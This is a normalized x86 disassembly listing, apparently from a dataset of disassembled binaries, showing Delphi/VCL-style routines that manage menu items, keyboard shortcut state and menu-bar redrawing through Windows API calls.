sub_44e1e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e208
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e228
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413fa0
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_448530
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_448668
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_4486c8
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_4483c8
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_448788
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e2a0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41970c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44d9b4
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44de50
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44e2f4
jmp r-xdata
xor edx edx
mov eax esi
call sub_44bdb8
sub_44e2f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44978c
mov eax ebx
call sub_44e364
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_4497d0
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_4194c0
sub_44e33c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44e33c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44b48c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44ddd0
mov eax ebx
pop esi
pop ebx
retn
sub_44e378
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c054
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4044bc
sub_44e3a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403ff4
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_44e42c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44e54e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_40421c
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_40421c
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_40447c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404368
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e555
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f80
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404504
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042dc
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_40421c
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_40447c
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4042dc
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_44e58c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44ea2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403ff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44e9ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44d9cc
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403ff4
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ea32
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403f80
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403f80
lea eax [ ebp - 0x18 ]
call sub_403f5c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax ebx
call sub_44ebe0
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d9dc
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404368
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_44e3a8
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44d9dc
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44d9dc
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403224
mov eax [ ebp - 0x20 ]
call sub_403224
mov eax [ ebp - 0x14 ]
call sub_403224
mov eax [ ebp - 0xc ]
call sub_403224
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_44e3a8
pop ecx
mov eax [ ebp - 0x30 ]
call sub_40421c
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_44d9dc
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_450484
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407a44
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403fb0
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c054
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c054
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44d9dc
push eax
mov edx esi
mov eax ebx
call sub_44d9dc
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_40447c
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407a44
push ebp
mov eax [ ebp - 0x2c ]
call sub_44e378
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_44e378
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c054
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403ff4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44d9dc
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_44d9dc
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_4503f0
mov edx [ ebp - 0x40 ]
pop eax
call sub_403fb0
mov edx esi
mov eax ebx
call sub_44d9dc
push eax
mov edx esi
mov eax ebx
call sub_44d9dc
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40421c
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_40447c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_44e42c
mov eax [ ebp - 0x18 ]
call sub_40421c
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4044bc
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404504
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_44e42c
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_44ea88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44d9cc
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44d9cc
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44ec0c
test al al
je r-xdata
mov eax esi
call sub_44d9cc
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44d9dc
call sub_44ea64
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_44d9dc
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44d9dc
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44d9dc
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44d9dc
call sub_44ea64
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44d9dc
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44d9dc
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44d9dc
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_44d9dc
call sub_44ea64
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_44ebe0
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44ebe0
and eax 0x7f
mov al [ eax + rw-data ]
sub_44ec0c
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44ec0c
and eax 0x7f
mov al [ eax + rw-data ]
sub_44ec38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b920
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_4193f0
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_44f964
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_44ecd4
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403224
mov eax [ esi + 0x44 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41943c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_44ed48
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44ed48
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44b48c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44ddd0
mov eax ebx
pop esi
pop ebx
retn
sub_44ed88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_44d9cc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_44d9dc
call sub_44ed88
pop ecx
test al al
je r-xdata
sub_44ee20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_44ed88
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44b48c
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_44ee50
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_44ee20
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_450174
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_44eec0
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_44ee20
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_44eedc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_44ee20
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_44e58c
mov ebx eax
xor edx edx
mov eax edi
call sub_44ea88
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_44def4
mov eax [ esi + 0x34 ]
call sub_44def4
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_44be30
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4423cc
push eax
call DrawMenuBar
sub_44efc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_44efc8
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_4036ac#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_44ee20
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_44def4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44efb8
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_44f11c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_422120
xor eax eax
push ebp
push sub_44f21a
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422120
xor eax eax
push ebp
push sub_44f1ef
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_44efc8
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422118
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f221
mov eax [ rw-data ]
call sub_422118
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_44ee20
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_44f240
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_44f5c4
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_44f5c4
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_44f2fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
